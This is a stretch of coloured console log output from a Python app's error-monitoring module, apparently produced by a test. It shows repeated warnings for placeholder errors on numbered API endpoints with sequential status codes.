WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895165Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3858'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895213Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3859'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895262Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3860'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895310Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3861'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895358Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3862'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895405Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3863'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895460Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3864'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895513Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3865'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895565Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3866'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895614Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3867'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3868'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895713Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3869'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895761Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3870'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895810Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3871'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895858Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3872'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895906Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3873'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895954Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3874'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896001Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3875'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896048Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3876'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896096Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3877'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896143Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3878'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896190Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3879'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896237Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3880'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896285Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3881'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896376Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3882'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3883'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896516Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3884'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896570Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3885'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3886'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3887'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896719Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3888'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896769Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3889'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896818Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3890'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3891'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3892'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.896962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3893'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897013Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3894'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897064Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3895'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897114Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3896'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.897162Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3897'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
